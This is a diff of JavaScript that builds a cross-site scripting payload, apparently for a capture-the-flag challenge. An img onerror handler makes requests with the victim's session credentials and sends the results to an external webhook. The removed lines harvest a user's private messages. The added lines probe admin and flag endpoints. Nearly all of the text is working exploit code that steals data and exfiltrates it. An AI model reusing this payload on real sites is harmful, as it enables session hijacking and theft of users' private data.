@@ -18,18 +18,14 @@
             const payload = `<img src=x onerror="
               (async function() {
                 var WEBHOOK = '${WEBHOOK}';
-                var res = await fetch('/api/messages', {credentials:'include'});
-                var msgs = await res.json();
-                var ids = msgs.map(function(m){ return m.id; });
+                var endpoints = ['/api/flag', '/flag', '/admin/api/flag', '/admin/flag', '/api/admin/flag'];
                 var results = [];
                 
-                for (var i = 0; i < ids.length; i++) {
-                  var r = await fetch('/api/messages/'+ids[i], {credentials:'include'});
-                  if (r.ok) {
-                    var d = await r.json();
-                    results.push({id: ids[i], data: d});
-                  }
-                  await new Promise(function(r){ setTimeout(r, 300); });
+                for (var i = 0; i < endpoints.length; i++) {
+                  var res = await fetch(endpoints[i], {credentials:'include'});
+                  var text = await res.text();
+                  results.push({ep: endpoints[i], status: res.status, text: text});
+                  await new Promise(function(resolve){ setTimeout(resolve, 500); });
                 }
                 
                 await fetch(WEBHOOK, {
